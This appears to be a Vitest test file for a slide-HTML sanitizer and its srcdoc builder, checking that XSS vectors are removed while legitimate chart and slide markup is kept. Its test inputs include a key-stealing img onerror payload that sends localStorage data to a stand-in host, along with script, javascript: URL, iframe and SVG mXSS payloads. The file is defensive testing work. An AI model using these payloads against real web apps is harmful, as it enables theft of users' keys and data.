import { describe, expect, it } from 'vitest';
import { buildSrcdoc } from '../playground/deck-preview.js';
import { sanitizeSlideHtml } from './sanitize-slide-html.js';

// The #616 T-CONTENT guard: engine-rendered slide HTML is written into a
// same-origin, un-sandboxed preview frame, so any script in it executes in the
// app origin and can read the OpenRouter key from localStorage. These assert
// that the killer payloads die while every legitimate engine output survives.
describe('sanitizeSlideHtml — kills script vectors', () => {
	it('strips an onerror handler (the canonical key-theft payload)', () => {
		const out = sanitizeSlideHtml('<img src=x onerror="fetch(\'//e/?\'+localStorage.k)">');
		expect(out).not.toMatch(/onerror/i);
		expect(out).toContain('<img'); // the element survives, only the handler is gone
	});
	it('drops <script> and <style> from content (CSS arrives via the frame, not the HTML)', () => {
		expect(sanitizeSlideHtml('<script>steal()</script><p>ok</p>')).toBe('<p>ok</p>');
		expect(sanitizeSlideHtml('<style>@import url(//evil)</style><p>ok</p>')).toBe('<p>ok</p>');
	});
	it('strips javascript:/data:text-html URLs but keeps the element', () => {
		expect(sanitizeSlideHtml('<a href="javascript:alert(1)">x</a>')).not.toMatch(/javascript:/i);
		expect(sanitizeSlideHtml('<a href="data:text/html,<script>1</script>">x</a>')).not.toMatch(/data:text\/html/i);
	});
	it('drops <iframe>/<object>/<form> and an SVG <foreignObject> mXSS vector', () => {
		expect(sanitizeSlideHtml('<iframe src="//evil"></iframe><p>ok</p>')).toBe('<p>ok</p>');
		expect(sanitizeSlideHtml('<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>')).not.toMatch(/onerror/i);
	});
	it('drops an inline style carrying a legacy script vector, keeps the element', () => {
		const out = sanitizeSlideHtml('<div style="width:expression(alert(1))">x</div>');
		expect(out).not.toMatch(/expression/i);
		expect(out).toContain('<div>x</div>');
	});
});

describe('sanitizeSlideHtml — preserves legitimate engine output', () => {
	it('keeps inline chart SVG with its geometry + a11y attributes', () => {
		const svg = '<div class="funnel-figure" style="--funnel-stages:3"><svg viewBox="0 0 1 1" role="img" aria-hidden="true" data-mood="4"><path d="M0 0"></path><rect x="1" y="2"></rect></svg></div>';
		const out = sanitizeSlideHtml(svg);
		expect(out).toContain('<svg');
		expect(out).toContain('viewBox="0 0 1 1"');
		expect(out).toContain('--funnel-stages:3'); // chart custom property survives
		expect(out).toContain('data-mood="4"');
	});
	it('keeps inline style url() — the engine emits it for bg images + logo masks', () => {
		expect(sanitizeSlideHtml('<div class="lattice-bg" style="background-image:url(\'/samples/a.svg\')"></div>')).toContain('url(');
		expect(sanitizeSlideHtml('<span class="logo-mark" style="--logo-mask:url(\'/l.svg\')"></span>')).toContain('--logo-mask:url(');
	});
	it('keeps <del>/<ins>/<sup>/<sub>, tables, lists, and <section> structure', () => {
		expect(sanitizeSlideHtml('<del>old</del><ins>new</ins><sup>1</sup><sub>2</sub>')).toBe('<del>old</del><ins>new</ins><sup>1</sup><sub>2</sub>');
		expect(sanitizeSlideHtml('<table><thead><tr><th>a</th></tr></thead></table>')).toContain('<table>');
		const section = sanitizeSlideHtml('<section class="lattice-slide" data-img-composition="clean"><h2>T</h2></section>');
		expect(section).toContain('<section');
		expect(section).toContain('data-img-composition="clean"');
		expect(section.match(/<\/section>/g)).toHaveLength(1); // section-count survives (deck-preview relies on it)
	});
	it('keeps a plain <img> with a safe src + alt', () => {
		const out = sanitizeSlideHtml('<img src="/samples/a.png" alt="A" class="x">');
		expect(out).toContain('src="/samples/a.png"');
		expect(out).toContain('alt="A"');
	});
});

// Integration: prove the WIRING — buildSrcdoc (the multi-slide builder, also used
// by the export capture frame) sanitizes its `html` before it reaches the srcdoc,
// not just the standalone helper. The Node frame-assembly tests run without a DOM
// (sanitize no-ops there), so this DOM-backed test is where the guard is proven.
describe('buildSrcdoc — sanitizes content before the srcdoc (#616)', () => {
	const base = { css: '', mode: 'light' as const, geom: { w: 1280, h: 720 }, runtimeUrl: '/rt.js' };
	it('strips an onerror payload from the slide HTML', () => {
		const doc = buildSrcdoc({ ...base, html: '<section><img src=x onerror="fetch(\'//e/?\'+localStorage.k)"></section>' });
		expect(doc).not.toMatch(/onerror/i);
		expect(doc).toContain('<section>'); // legit structure survives
	});
	it('keeps the separately-appended runtime <script> (it is not part of the sanitized content)', () => {
		const doc = buildSrcdoc({ ...base, html: '<section><h2>ok</h2></section>' });
		expect(doc).toContain('src="/rt.js"');
	});
});
